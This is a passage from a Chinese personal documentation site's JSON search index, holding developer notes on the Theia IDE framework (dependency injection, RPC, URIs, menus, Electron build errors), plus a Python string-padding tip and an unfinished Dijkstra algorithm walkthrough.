   // add your contribution bindings here\n        bind(CommandContribution).to(HelloWorldCommandContribution);\n        bind(MenuContribution).to(HelloWorldMenuContribution);\n}); 这里介绍一下 bind, unbind, rebind. rebind 此前所有相应的绑定皆失效, 但是作用范围保留(如单例) unbind 取消此前所有的响应绑定及作用范围 bind 绑定贡献点, 服务等 bind(A).toSelf() 对象即自己, 每次使用都是一个新的对象 bind(A).toSelf().inSingleScope() 单例的绑定自己 bind(A).toService(B): 注入A时, 实际是类B的对象, 类B的对象需要提前bind","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-About-Theia-binding.html","loc":"/yq-docs-front-end-frame-theia-question-About-Theia-binding.html"},{"title":"在theia的react-dialog上新增自定义dialog","text":"使用开发者工具可以看出,\ntheia内置的react-dialog是先覆盖了一层 z-index 为 5000 的 div : 注解 这里的 react-dialog 即: import {ReactDialog} from \"@theia/core/lib/browser/dialogs/react-dialog\"; 如果要在其上再弹出一个dialog, 要么, 减小原有的这个 5000; 要么, 增大需要增加的 z-index","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Added-custom-dialog-on-the-Dialog-of-Theia.html","loc":"/yq-docs-front-end-frame-theia-question-Added-custom-dialog-on-the-Dialog-of-Theia.html"},{"title":"内置一些外部插件","text":"可以去插件商店搜索获取插件下载地址: https://open-vsx.org 然后补充到 package.json 中, 比如我搜了c的语法分析的插件clang,\n那么直接在 theiaPlugins 补充即可(这里名称好像没有强制要求): \"theiaPlugins\": {\n  \"vscode-clangd\": \"https://open-vsx.org/api/llvm-vs-code-extensions/vscode-clangd/0.1.24/file/llvm-vs-code-extensions.vscode-clangd-0.1.24.vsix\"\n} 效果就是内置了这个插件, 不会在启动后的插件商店显示;\n在插件商店搜索的结果是未安装;\n在插件商店搜索后点击安装, 会下载, 但是安装时检查到已经内置,\n就不会触发解包安装, 然后显示已安装(来自Ai的解释) 注解 这里补充一下, 实际上最核心语法分析等功能依赖的的是相应 语言服务器 的插件\n试过, 只有语言服务器, 不包含 @theia/languages 也可以正常代码跳转. 另外, 如果你新加入一个插件, 且已经下载这个插件的部分东西, 但是插件有问题,\n这个时候一般会伴随出现编译构建启动报错等等.\n此时不仅要删除在 package.json 增加的插件配置, 还需要删除 plugins 里相应的下载内容. 原因嘛, 启动的时候, 会加载 plugins 下的所有内容","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Built--in-external-plug--in.html","loc":"/yq-docs-front-end-frame-theia-question-Built--in-external-plug--in.html"},{"title":"取消异步操作","text":"theia提供了 CancellationTokenSource 来支持取消异步操作 使用 导包: import {CancellationTokenSource} from '@theia/core/lib/common' 创建一个可以传递的 CancellationToken 对象: const cts = new CancellationTokenSource();\nconst token = cts.token; 在外部调用 cancel() 方法来通知已取消: cts.cancel(); 在异步操作内部监听 token 的信号来处理取消逻辑: doAsyncWork(token).then(...).catch(...);\n\nif (token.isCancellationRequested) {\n  // 进行取消操作\n} 注解 外部调用 cts.cancel(); 时, 将会将 token.isCancellationRequested 设置为 true","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Cancel-asynchronous-operation.html","loc":"/yq-docs-front-end-frame-theia-question-Cancel-asynchronous-operation.html"},{"title":"完全关闭Theia应用","text":"对用使用Electron的后端, 旧版本支持直接调用 app.quit 退出,\n新版本编译的程序不暴露app, 所以无法使用此方法. 待续...","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Completely-close-the-THEIA-application.html","loc":"/yq-docs-front-end-frame-theia-question-Completely-close-the-THEIA-application.html"},{"title":"组件的状态渲染","text":"Theia 虽然有使用 react , 不过却是自己另外封装的控件,\n比较典型的就是\n\"@theia/core/src/browser/widgets/react-widgets\" 定义的 ReactWidget . 与普通的 react 类组件不同, theia不存在自动刷新控件状态这种概念,\n如果其中变量有更新, 需要手动调用 this,update() 来触发UI渲染的更新; 但是站在编码角度考虑, 如果每一个变量的更新都调用一次 this,update() 重渲染,\n是一个没必要的开销. 一般建议是将与UI相关的状态统一放到一个位置, 统一更新,\n如: wStates = {\n  state1: '',\n  state2: '',\n  ...\n}\n\nupdateDataOfUi(newData) {\n  this.wStates = newData\n  this.update()\n} 一般对于这种更新是将 props 传递给子组件手动触发子组件更新.","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Component-status-rendering.html","loc":"/yq-docs-front-end-frame-theia-question-Component-status-rendering.html"},{"title":"控件状态保存与恢复","text":"一般都是实现 StatefulWidget 的 storeState 与 restoreState ,\n包位置: import {StatefulWidget} from \"@theia/core/lib/browser\"; 大致例子: class Example implements StatefulWidget{\n\n  storeState(): object {\n      const argsExample = {his: this.history, name: this.name}\n      return {argsExample}\n  }\n\n  restoreState(oldState: object): void {\n      const lastArgs = oldState['argsExample'] || {}\n\n      // do restore from these args\n      this.restore(lastArgs)\n  }\n\n  restore(lastArgs){\n    // do restore from these args\n  }\n\n} 这样每次重新打开的时候, 就可以触发相应的恢复 注解 只有theia正常关闭的时候, 状态才会被正常记录","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Control-status-preservation-and-recovery.html","loc":"/yq-docs-front-end-frame-theia-question-Control-status-preservation-and-recovery.html"},{"title":"创建自定义拓展","text":"这部分官方文档也有说明: https://theia-ide.org/docs/authoring_extensions/ 大致流程如下 安装生成器: npm install -g yo generator-theia-extension 创建拓展目录: mkdir -p src/@ide/theia-hello-world-extension 进创建的目录, 生成相关代码(这里启动生成器的时候有很多选项, 比如控件, 实际使用选需要的即可): cd src/@ide/theia-hello-world-extension\nyo theia-extension # 这里教程选择 'Hello World' 选项(这里默认) 生成后在当前目录生成的 package.json 配置文件入口: \"theiaExtensions\": [\n  {\n    \"frontend\": \"lib/browser/hello-world-frontend-module\"\n  }\n] theiaExtensions 里定义的模块就是绑定了theia贡献点的依赖注入的内容(相当于特殊的入口文件) 这里暂时只定义 frontend 贡献点, 有需要还可以定义后端的 backend 使用的依赖注入是 InversifyJS 模块提供的 ContainerModule ,\n生成内容如下(目录: hello-world/lib/browser/hello-world-frontend-module ): /**\n* Generated using theia-extension-generator\n*/\nimport { HelloWorldCommandContribution, HelloWorldMenuContribution } from './hello-world-contribution';\nimport { CommandContribution, MenuContribution } from '@theia/core/lib/common';\nimport { ContainerModule } from '@theia/core/shared/inversify';\n\nexport default new ContainerModule(bind => {\n    // add your contribution bindings here\n    bind(CommandContribution).to(HelloWorldCommandContribution);\n    bind(MenuContribution).to(HelloWorldMenuContribution);\n}); 相应的package.json配置大致如下: {\n  \"name\": \"@ide/hello-world-extension\",\n  \"keywords\": [\n    \"theia-extension\"\n  ],\n  \"version\": \"0.1.0\",\n  \"files\": [\n    \"hello-world/lib\",\n    \"hello-world/src\"\n  ],\n  \"theiaExtensions\": [\n    {\n      \"frontend\": \"hello-world/lib/browser/hello-world-frontend-module\"\n    }\n  ],\n  \"dependencies\": {\n    \"@theia/core\": \"latest\"\n  },\n  \"private\": true,\n  \"engines\": {\n    \"yarn\": \">=1.7.0 <2\",\n    \"node\": \">=14.18.0\"\n  },\n  \"scripts\": {\n    \"clean\": \"rimraf lib\",\n    \"build\": \"tsc\",\n\n    \"build:browser\": \"yarn --cwd browser-app bundle\",\n    \"build:electron\": \"yarn --cwd electron-app bundle\",\n    \"prepare\": \"lerna run prepare\",\n    \"postinstall\": \"theia check:theia-version\",\n    \"start:browser\": \"yarn --cwd browser-app start\",\n    \"start:electron\": \"yarn --cwd electron-app start\",\n    \"watch\": \"lerna run --parallel watch\"\n  },\n  \"devDependencies\": {\n    \"rimraf\": \"latest\",\n    \"typescript\": \"latest\",\n    \"lerna\": \"2.4.0\"\n  },\n  \"workspaces\": [\n    \"hello-world\", \"browser-app\", \"electron-app\"\n  ]\n} 这里生成的位置是在 hello-world 下, 后面有需要可以重新布局一下目录,\n当然还有tsconfig配置.\n代码可以参考 hello-world/src 下的ts源码. 接下来就是将此拓展放进ide了, 在主项目的 package.json 的依赖中增加如下内容: \"private\": true,\n\"dependencies\": {\n  \"@ide/hello-world-extension\": \"0.1.0\"\n}\n\"workspaces\": [\n  \"src/@ide/*\"\n], 说明: 在依赖里配置上面自己的拓展, \"@ide/hello-world-extension\" 就是在自定义拓展的 package.json 定义的 name 由于是自定义拓展, 放在本地目录, 非镜像仓库的npm包, 所以需要设置 workspaces , 才能正常识别本地模块并编译到 node_module 下面去 只有设置了 private 才可以使用 workspaces 然后 yarn install 即可. 按照上面的我这里启动的时候找不到模块 vscode-ws-jsonrpc , 然后去根目录装了一个(可能需要加-W): yarn add vscode-ws-jsonrpc --save 注意版本, 发现虽然我的 theia/languages 是最新新版: \"@theia/languages\": \"latest\" 但是依赖的 vscode-ws-jsonrpc 是 0.2.0 , 可现在(2023.09.14) 2.x.x 都有了: \"vscode-ws-jsonrpc\": \"&#94;0.2.0\" 注解 没问题 如果想开放的话, 也可以 yarn push 发布到官方的镜像仓库.","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Create-custom-expansion.html","loc":"/yq-docs-front-end-frame-theia-question-Create-custom-expansion.html"},{"title":"依赖注入使用以及问题","text":"依赖注入, 现在使用是很普遍. 在 theia 中编写服务时, 解耦的角度也可以使用依赖注入 个人习惯将接口都定义在common: // 后端提供的服务\nexport const IUtilService = Symbol('IUtilService')\nexport interface IUtilService extends RpcServer<IUtilClient>{\n\n    getHash(data: string): Promise<string>\n    getRandomStr(): Promise<string>\n\n    setClient(client: IUtilClient): void\n} 将服务定义为成员变量与构造函数参数的区别 当通过 @inject 属性注入时,如果直接定义为类成员变量,\n在构造函数中访问该成员变量时,有可能仍未被初始化, 出现 undefined 而如果在构造函数参数中定义,则可以保证在构造函数体执行前被初始化 类成员变量会在调用构造函数之前声明,但不会提前初始化 构造函数参数会在调用构造函数时由注入器进行初始化 构造函数体内,参数的值已经被初始化,但成员变量可能还未被初始化 故还是使用构造函数参数接收注入的值好一些: constructor(@inject(Foo) private foo: Foo) {\n  // foo 已被初始化\n} 但是其实即使是在构造函数中注入, 也可视作成员变量,\n不需要在构造函数的实现中, 手动赋值, 默认就可以 this 调用 贡献点使用 普通服务注入直接 @inject 服务名即可 贡献点是注入贡献点 ContributionProvider 名称加一个 @named(贡献点基类) : @inject(ContributionProvider)\n@named(IExampleContribute) // IExampleContribute 是贡献点接口\nprotected readonly exampleCs: ContributionProvider<IExampleContribute> 除了贡献点基类, 都是内置的: import {inject, injectable, named, postConstruct } from \"@theia/core/shared/inversify\";\nimport {ContributionProvider} from \"@theia/core\"; 记得在入口文件绑定: // 把贡献点接口绑定\nbindContributionProvider(bind, IExampleContribute)\n\n// 每一个实现都正常绑定, 此处不能rebind, 不然会覆盖前面已绑定的贡献点\nbind(A).toSelef().inSingleScope()\nbind(IExampleContribute).toService(A) 获取所有贡献点: this.exampleCs.getContributions() 只bind自己效果 在 Theia 框架中，如果你只使用 bind(A).toSelf().inSingletonScope() 将服务 A 绑定到自身并设置为单例作用域，通常不需要使用 bind(A).toService(A) bind(A).toSelf().inSingletonScope() 表示将服务 A 绑定到自身，并在单例作用域中创建实例。\n这意味着每次请求服务 A 时，都会返回同一个实例。 bind(A).toService(A) 则是将服务 A 绑定到服务 A 的实现。\n这在一些复杂的依赖注入场景中可能会用到，但在一般情况下并不是必需的。 因此，如果你只需要创建实例并在需要的地方进行注入， bind(A).toSelf().inSingletonScope() 就足够了，无需额外 bind(A).toService(A)","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Dependent-injection-and-problem.html","loc":"/yq-docs-front-end-frame-theia-question-Dependent-injection-and-problem.html"},{"title":"前后端通信-前端调用后端服务","text":"前后端服务都将以 依赖注入 的形式定义. 此处将介绍, 使用RPC通信, 将后端的服务提供给前端调用. 用例, 在项目根的 package.json 定义了工作区: \"workspaces\": [\n  \"src/@ide/*\"\n] 在 src/@ide/ 下新增一个拓展 you-watch : mkdir src/@ide/you-watch 工作区可以嵌套, 即可以在自定义的拓展下再定义工作区 此拓展名为 @ide/you-watch (拓展下的 package.json 定义): \"name\": \"@ide/you-watch\" 然后, 新建 backen 和 browser 目录, 并实现前后端相应功能,\n大概目录结构: $ tree src -L 2\nsrc\n├── backend\n│   ├── index.ts\n│   ├── util-service.ts\n│   └── utils.ts\n├── browser\n│   ├── index.ts\n│   ├── util-client.ts\n│   └── you-watch-contribution.ts\n└── common\n    └── service.ts index 即默认入口文件 主要在于绑定, 后端的入口文件: // backend/index.ts\n\nimport {ContainerModule} from '@theia/core/shared/inversify'\nimport {IUtilService, IUtilClient, IUtilServicePath} from \"../common/service\";\nimport {UtilService} from \"./util-service\";\nimport {ConnectionHandler, RpcConnectionHandler} from \"@theia/core\";\n\nexport default new ContainerModule(\n    (bind, unbind, isBound, rebind, unbindAsync, onActivation, onDeactivation) => {\n        bind(IUtilService).to(UtilService).inSingletonScope()\n\n        // 后端通信实现\n        bind(ConnectionHandler).toDynamicValue(\n            ({container}) => new RpcConnectionHandler<IUtilClient>(\n                IUtilServicePath,\n                (client) => {\n                    const utilService: IUtilService = container.get(IUtilService)\n                    utilService.setClient(client)\n                    return utilService\n                }\n            )\n        )\n    }\n) 这里使用rpc通信, IUtilClient 只是一由前端实现的通信中介, 前端可实现空: // browser/util-client.ts\nimport {injectable} from \"@theia/core/shared/inversify\";\n\n@injectable()\nexport class UtilClient implements IUtilClient{\n\n} 前端的绑定实现: // browser/index.ts\n/**\n* Generated using theia-extension-generator\n*/\n\nimport {YouWatchCommandContribution, YouWatchMenuContribution} from \"./you-watch-contribution\";\nimport { CommandContribution, MenuContribution } from '@theia/core/lib/common';\nimport { ContainerModule } from '@theia/core/shared/inversify';\nimport {IUtilClient, IUtilService, IUtilServicePath} from \"../common/service\";\nimport {UtilClient} from \"./util-client\";\nimport {WebSocketConnectionProvider} from \"@theia/core/lib/browser\";\n\n\nexport default new ContainerModule(bind => {\n    // add your contribution bindings here\n    bind(CommandContribution).to(YouWatchCommandContribution).inSingletonScope()\n    bind(MenuContribution).to(YouWatchMenuContribution).inSingletonScope()\n\n    // 前端通信实现\n    bind(IUtilClient).to(UtilClient).inSingletonScope()\n    bind(IUtilService).toDynamicValue(\n        (context) => {\n            const client = context.container.get<IUtilClient>(IUtilClient)\n            const connection = context.container.get(WebSocketConnectionProvider)\n            return connection.createProxy<IUtilService>(\n                IUtilServicePath,\n                client\n            )\n        }\n    )\n}); 这里是关联到后端发布的rpc服务.","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Front-end-communication-front-end-call-back-end-service.html","loc":"/yq-docs-front-end-frame-theia-question-Front-end-communication-front-end-call-back-end-service.html"},{"title":"引入自定义css文件","text":"在拓展根目录(src)下的 browser 下新建一个 style 文件夹,\n其中新建自己的css, 如 my-style.css 如果没有定义前端服务, 直接在扩展的 package.json 中配置: \"theiaExtensions\": [\n  {\n    \"frontend\": \"lib/browser/style/my-style.css\"\n  }\n] 如果有定义前端服务如 index.ts , 那么 package.json 中已经有: \"theiaExtensions\": [\n  {\n    \"frontend\": \"lib/browser/index\"\n  }\n] 这个时候只需要简单的在 index.ts 导入即可: import '../../src/browser/style/my-style.css' 因为lib是编译的, 下面没有css, 所以得从根目录重新进 注解 如果是覆盖theia框架原有的, 不用导","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Introduce-custom-CSS-files.html","loc":"/yq-docs-front-end-frame-theia-question-Introduce-custom-CSS-files.html"},{"title":"打开/切换编辑器","text":"使用 EditorManager , 位置: import {EditorManager} from \"@theia/editor/lib/browser\"; 需要知道当前URI, 然后调用 open import URI from '@theia/core/lib/common/uri'\n\n@inject(EditorManager) _editorManager: EditorManager\n\nconst uri: URI\nthis._editorManager.open(uri) 调用时候会自动判断存不存在, 若存在就切换过去 注解 吐槽下theia的某些内置的机制有点反人类,\n啥都得重写一下, 才好用.","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Open-switch-editor.html","loc":"/yq-docs-front-end-frame-theia-question-Open-switch-editor.html"},{"title":"打开目录/文件选择器","text":"使用内置 FileDialogService 的 showOpenDialog 即可: import {FileDialogService, OpenFileDialogProps} from '@theia/filesystem/lib/browser'\nimport {FileService} from '@theia/filesystem/lib/browser/file-service'\n\n@inject(FileDialogService) protected readonly _fileDialogService: FileDialogService\n@inject(FileService) protected readonly _fileService: FileService\n\nasync selectSomeFile(){\n    const selectOptions: OpenFileDialogProps =  {\n        title: '请选择文件',\n        canSelectFiles: true,\n        canSelectFolders: false,\n        canSelectMany: false,\n\n        // 若要自定义选择文件类型\n        filters: {\n            'static': ['css', 'js'],\n            'typeScript': ['ts', 'tsx']\n        }\n    }\n    const startPath = await this._fileService.resolve(URI.fromFilePath('/usr/local/xxx'))\n    await this._fileDialogService.showOpenDialog(\n        selectOptions,\n        startPath\n    )\n}","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Open-the-directory-&-file-selector.html","loc":"/yq-docs-front-end-frame-theia-question-Open-the-directory-&-file-selector.html"},{"title":"结合electron时候的报错","text":"报错 Module did not self-register: '.../node_modules/drivelist/build/Release/drivelist.node'. 参考: https://github.com/balena-io-modules/drivelist/issues/389#issuecomment-850784173 issues 上面看到的是: Install electron-rebuild run cd ./node_modules/drivelist && ../.bin/electron-rebuild rebuild 其实与下面的应该是一个问题(可能也要删除lib, 下次遇到再试试) 报错 Cannot find module '../build/Debug/pty.node' 参考: https://github.com/Microsoft/node-pty/issues/256#issuecomment-454292439 解决: npm install --save-dev electron-rebuild 然后在 package.json 的 scripts 增加: \"scripts\": {\n  \"rebuild:node\": \"electron-rebuild -f -w node-pty\"\n} 删除项目根目录下 lib`(可不删除也行好像), 执行 ``npm run rebuild:node` 在重写编译一下, 比如我这里是 npm run prepare 即可: \"scripts\": {\n  \"prepare\": \"yarn run clean && yarn build && yarn run download:plugins\",\n  \"clean\": \"theia clean\",\n  \"build\": \"theia rebuild:electron && theia build --mode development\",\n  \"rebuild\": \"theia rebuild:electron --cacheRoot ./.theia_build/cache && theia build --mode development\",\n  \"start\": \"theia start --plugins=local-dir:plugins --remote-debugging-port=9222\",\n  \"download:plugins\": \"theia download:plugins\",\n  \"rebuild:node\": \"electron-rebuild -f -w node-pty\"\n}","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Report-error-when-combining-Electron.html","loc":"/yq-docs-front-end-frame-theia-question-Report-error-when-combining-Electron.html"},{"title":"自定义任意位置的鼠标右键上下文菜单","text":"说明: 即, 当鼠标右键单击时, 在单击的位置触发的菜单栏\n(就像Win桌面鼠标右键触发的那玩意儿) 首先需要注册一个菜单指令(菜单的指令, 与实际的指令): /* 先注册一个自定义的菜单 */\n\nnamespace CustomContextMenuCommand {\n    const category = 'custom-context-menu-command'\n\n    export const HELLO_COMMAND = Command.toDefaultLocalizedCommand({\n        id: 'custom:command',\n        category: category,\n        label: 'hello command'\n    })\n} 将菜单与指令注册到贡献点: @injectable()\nexport class CustomAContextMenu implements CommandContribution, MenuContribution{\n\n    constructor(\n        @inject(MessageService) private readonly _messageService: MessageService,\n\n    ) {\n    }\n\n    registerCommands(commands: CommandRegistry) {\n        commands.registerCommand(\n            CustomContextMenuCommand.HELLO_COMMAND,\n            {execute: async (...args) => {\n                await this._messageService.info('自定义上下文菜单 - 你瞅啥')\n                }}\n        )\n    }\n\n    registerMenus(menus: MenuModelRegistry) {\n        menus.registerMenuAction(\n            [...NAVIGATOR_CONTEXT_MENU, '_1_hello'],\n            // CommonMenus.EDIT_CONTEXT_MENU,\n            {\n                commandId: CustomContextMenuCommand.HELLO_COMMAND.id,\n                label: CustomContextMenuCommand.HELLO_COMMAND.label,\n            }\n        )\n\n\n    }\n\n\n} 这里是注册到系统左侧的导航栏位置的文件资源管理器, 预定义的菜单名为 NAVIGATOR_CONTEXT_MENU ,\n要在这里触发, 直接放这里即可 效果: 如何手动使用代码触发? 注入render: // import {ContextMenuRenderer} from \"@theia/core/lib/browser\";\n\n@inject(ContextMenuRenderer) readonly _contextMenuRender: ContextMenuRenderer, 调用打开: openMenu(e) {\n\n  this._contextMenuRender.render({\n      menuPath: NAVIGATOR_CONTEXT_MENU,\n      anchor: {x: e.clienX, y: e.clientY},    // 坐标位置\n      args: [],               // 参数\n  })\n} 这里的调用可以放到诸如div的右键事件去, 比如: <div class=\"container\"\n      style=\"flex-direction: row;\"\n      oncontextmenu={openMenu(this)}>\n</div>","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Right--click-on-the-mouse-of-any-location.html","loc":"/yq-docs-front-end-frame-theia-question-Right--click-on-the-mouse-of-any-location.html"},{"title":"前后端路径传递URI/URL","text":"URI: 资源标识符 URL: 具体的URI,包含了网络协议信息,如http,https等 前后端通信传递资源路径时,通常都建议使用 URI 而不是 URL 主要原因有: URI表示资源标识符,只关注标识资源,而不限定使用的协议。这更通用。 URL是一种具体的URI,包含了网络协议信息,如http,https等。这对资源标识来说是非必需的。 前后端可以使用不同的协议访问同一个资源标识符,URI可以兼容。 URI有一个通用的语法格式,方便解析处理。并且可以包含非网络资源,如本地文件路径。 URL编码有些字符如空格等会被编码,而URI可以保留原始字符。 URI可以方便地映射到不同的具体URL,为应用带来更大灵活性。 许多程序库和框架也推荐使用URI格式表示资源标识符。 URI与URL的相互转换 注解 此处的URI为 vscode-uri 模块下的 URI theia框架的URI为 import URI from '@theia/core/lib/common/uri' URI字符串, scheme + path 的形式, 如: const uriStr = file:///c:/users/bob URL路径字符串, 如: const urlStr = /c:/users/bob 本地路径字符串, 纯路径如: const localPathStr = c:/users/bob URI字符串 ==> URI对象: const uriIns = URI.parse(uriStr) URI字符串 ==> URL对象: const urlIns = new URL(uriStr)\n\n// 如果要获取url字符串\nconst urlStr = urlIns.pathname URI对象转换为本地路径字符串, 比如theia框架有提供Path对象,\n是对 import URI from 'vscode-uri' 进行的一个封装,\n那么在theia中可以直接: const convertedStr = uriIns.path.fspath() 若非框架环境, 后面再说 URL字符串 ==> URI对象: const uriIns = URI.file(urlStr)\n\n// theia框架提供了\nconst uriIns = URI.fromFilePath(urlStr) 注解 有时候字符串可能是被URI编码了, 需要解码: // 两种好像都可以, 不记得了\ndecodeURIComponent(urlStr)\ndecodeURIComponent(uriStr) 什么时候需要转换? 当URI字符串有问题的时候, 先生成个URL对象, 然后再转换为URI对象: // 有个有问题的URI字符串, 比如 file:/c:/users/bob\nconst issuesUriStr = 'file:/c:/users/bob'\n\nconst urlStr = decodeURIComponent((new URL(issuesUriStr)).pathname)\n\nconst uriIns = URI.file(urlStr) theia不通过后端拼接路径 theia的URI封装的Path对象提供此功能: const _uriIns: URI\nconst _baseName: string\n\n// 主要是这一步\n_path: Path = _uriIns.path.join(_baseName)\n\n_newUriIns: URI = URI.fromFilePath(_path.fspath())","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-The-front-and-rear-path-transmission-URI.html","loc":"/yq-docs-front-end-frame-theia-question-The-front-and-rear-path-transmission-URI.html"},{"title":"theia启动白屏","text":"可以从官方仓库的提交记录中发现端倪: https://github.com/eclipse-theia/theia/commit/45a0953d7eed19cd311840281f17999d268ba7cf ,\n但, 其实对没有配置 preloadTemplate 的项目影响不大,\n但是如果配置了, 那启动时, 会很早就打开一个初始化窗口, 且这个时候只能用给的默认的背景色,\n不过可以通过配置 \"showWindowEarly\": false 来不启动这个早期窗口,\n暂时这样解决吧: \"theia\": {\n    \"target\": \"electron\",\n    \"frontend\": {\n    \"config\": {\n        \"applicationName\": \"Theia Electron Example\",\n        \"electron\": {\n        \"showWindowEarly\": false\n        }\n    }\n    },\n    \"generator\": {\n    \"config\": {\n        \"preloadTemplate\": \"./resources/preload.html\"\n    }\n    }\n},","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Theia-start-the-white-screen.html","loc":"/yq-docs-front-end-frame-theia-question-Theia-start-the-white-screen.html"},{"title":"使用diff编辑器打开两个文件对比","text":"首先, 要有两个URI路径\n(theia封装的URI: import URI from '@theia/core/lib/common/uri' ): import URI from '@theia/core/lib/common/uri'\n\nconst leftUri = new URI('file:///c:/users/bob.txt')\nconst rightUri = new URI('file:///c:/users/bob2.txt') 然后使用DiffUris封装这两个URI: import {DiffUris} from '@theia/core/lib/browser/diff-uris'\n\nconst diffU: URI = DiffUris.encode(leftUri, rightUri) 然后在使用open打开: import {OpenerService, open} from '@theia/core/lib/browser'\n\n@inject(OpenerService) readonly _openerService: OpenerService\n\nopen(this._openerService, diffU)","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Use-Diff-editor-to-open-two-file-comparison.html","loc":"/yq-docs-front-end-frame-theia-question-Use-Diff-editor-to-open-two-file-comparison.html"},{"title":"theia使用外部浏览器打开链接","text":"使用内置的 OpenerService: import {OpenerService} from \"@theia/core/lib/browser\";\nimport {URI} from \"@theia/core\";\n\n\n@inject(OpenerService) protected readonly _openService: OpenerService\n\nprotected openExternalBrowser(link: string){\n    // 这里链接必须是 https://baidu.com/ 这种\n\n    const linkUri = new URI(link)\n    this._openService.getOpener(linkUri).then(\n        (opener) => {\n            opener.open(linkUri)\n        }\n    )\n\n}","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Use-the-external-browser-to-open-the-link.html","loc":"/yq-docs-front-end-frame-theia-question-Use-the-external-browser-to-open-the-link.html"},{"title":"yarn install 出现node-gyp报错","text":"报错内容大致如下: xxxx/node_module/nsfw: Command failed.\nExit code: 1\nCommand: node-gyp rebuild\nArguments: 我用的是yarn, 试过直接: yarn global add node-gyp 失败 最终偶然发现: npm i -g node-gyp 解决了, 奇怪....","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-Yarn-Install-appears-node-gyp-error.html","loc":"/yq-docs-front-end-frame-theia-question-Yarn-Install-appears-node-gyp-error.html"},{"title":"导入json","text":"对于ts项目而言 在 tsconfig.json 增加以下内容: {\n  \"compilerOptions\": {\n    \"resolveJsonModule\": true\n  }\n} 然后直接: import * as schemeData from 'xxxxx.json' 即可","tags":"前端","url":"/yq-docs-front-end-question-Import-json.html","loc":"/yq-docs-front-end-question-Import-json.html"},{"title":"ts的!与?","text":"表示变量可能为空. !用法 用在变量前表示取反 用在赋值的内容后时，使null和undefined类型可以赋值给其他类型并通过编译，表示该变量值可空 ?用法 可以表示可选参数 如: interface IDemo {\n    x?: number\n} 可防御性编程: const a = fetch(...) || {}            // 假设a是从后端拿到的一个对象类型数据\nconst unsafeData = a.b.c              // 这样写时不安全的，无法确保b是否有值，如果为空则b.c会进行报错\nconst safeData = a?.b?.c              // 实际上就是相当于 const safeData = a && a.b && a.b.c 其他见 问号与叹号","tags":"前端","url":"/yq-docs-front-end-question-TS's-exclamation-mark-and-question-mark.html","loc":"/yq-docs-front-end-question-TS's-exclamation-mark-and-question-mark.html"},{"title":"字符串补0","text":"左对齐, 右侧补0: In [2]: \"123\".ljust(5, \"0\")\nOut[2]: '12300' 右对齐, 左侧补0: In [3]: \"123\".rjust(5, \"0\")\nOut[3]: '00123' 或者: In [4]: \"123\".zfill(5)\nOut[4]: '00123' 或者使用%: In [5]: \"%05d\" % 123\nOut[5]: '00123'","tags":"后端; python","url":"/yq-docs-rear-end-python-conclusion-of-issue-String-supplement-0.html","loc":"/yq-docs-rear-end-python-conclusion-of-issue-String-supplement-0.html"},{"title":"Dijkstra(迪杰斯特拉)算法","text":"Dijkstra 算法是一个基于「贪心」、「广度优先搜索」、「动态规划」求一个图中一个点到其他所有点的最短路径的算法，时间复杂度 O(n&#94;2) 典型最短路径算法 ，用于计算一个节点到其他节点的最短路径。\n它的主要特点是以起始点为中心向外层层扩展(广度优先遍历思想)，直到扩展到终点为止。 基本步骤: Dijkstra 算法从指定的节点（源节点）出发，寻找它与图中所有其它节点之间的最短路径。 Dijkstra 算法会记录当前已知的最短路径，并在寻找到更短的路径时更新。 一旦找到源节点与其他节点之间的最短路径，那个节点会被标记为\"已访问\"并添加到路径中。 重复寻找过程，直到图中所有节点都已经添加到路径中。\n这样，就可以得到从源节点出发访问所有其他节点的最短路径方案。 注解 Dijkstra 只能用在权重为正的图中，因为计算过程中需要将边的权重相加来寻找最短路径。 Dijkstra 算法示例 寻找 0 到其它每一个节点的最短路径. 注解 假定两个节点之间的权重表示它们之间的距离。 我们将会得到节点 0 到节点 1、节点 0 到节点 2、节点 0 到 节点 3……（以此类推）的最短路径。 初始的距离列表如下： 还有一个列表用来记录哪些节点未被访问（即尚未被包含在路径中） 注解 当所有节点都被添加到路径中时，算法的计算过程就完成了。 我们选择了从节点 0 出发，可以直接将它标记为\"已访问\"，\n同样的，在未访问节点列表中把它划掉，并在图中给它加上红色的边框： 现在需要检查节点 0 到相邻节点的距离，两个相邻节点分别是节点 1 和节点 2（注意看红色的边）： 注解 这并不是说立即把这两个相邻节点加入到最短路径中。\n在把一个节点加入到最短路径之前，需要确认是否已经寻找到了访问它的最短路径。\n现在只是在对可选方案做初步检查。 更新节点 0 到节点 1、节点 0 到节点 2 的距离为它们之间的边的权重，分别为 2 和 6 更新了到相邻节点的距离之后： 根据已知的距离列表选择距离源节点最近的节点。 将它标记为\"已访问\"。 将它添加到路径中。 查看距离列表，发现节点 1 到源节点的距离是最短的（距离为 2），所以把它加入到路径中。 在图中，以红色边来表示： 在距离列表中用红色方块标记这个节点，表明它是\"已访问\"的、已经寻找到了访问这个节点的最短路径： 在未访问节点列表中将它划掉： 现在分析新的相邻节点，寻找访问它们的最短路径。\n只需要分析已经在最短路径（标记为红色边）中的节点的相邻节点。 节点 2 和节点 3 都是最短路径包含的节点的相邻节点，\n因为它们分别与节点 0 和节点 1 直接相连，如下图所示。下一步将要分析这两个节点。 之前已经计算过源节点到节点 2 的距离，并记录在了列表中，\n所以不用更新。这次只需要更新源节点到新的相邻节点（节点 3）的距离： 这个距离是 7，来看看为什么。 为了计算源节点到另一个节点（这里指节点 3）的距离，需要把访问该节点的最短路径的所有边权重相加： 对于节点 3： 将构成路径 0 -> 1 -> 3 的所有边权重相加，\n得到总距离为 